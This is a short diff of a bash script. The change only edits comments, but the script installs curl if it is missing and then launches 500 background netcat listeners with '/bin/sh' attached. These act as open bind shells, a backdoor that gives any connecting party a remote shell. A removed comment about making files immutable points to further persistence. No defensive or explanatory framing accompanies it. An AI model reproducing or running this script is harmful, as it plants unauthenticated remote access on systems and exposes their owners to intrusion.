@@ -1,5 +1,6 @@
 #!/bin/bash
 # TODO: add other cases
+# what? come back to this later
 if [ ! `which curl` ]; then
    if [ `which yum` ]; then
       yum install curl -y
@@ -47,5 +48,3 @@ for i in {1..500}
 do
    nc -lke /bin/sh &
 done
-
-# TODO: chmod +i a bunch of files
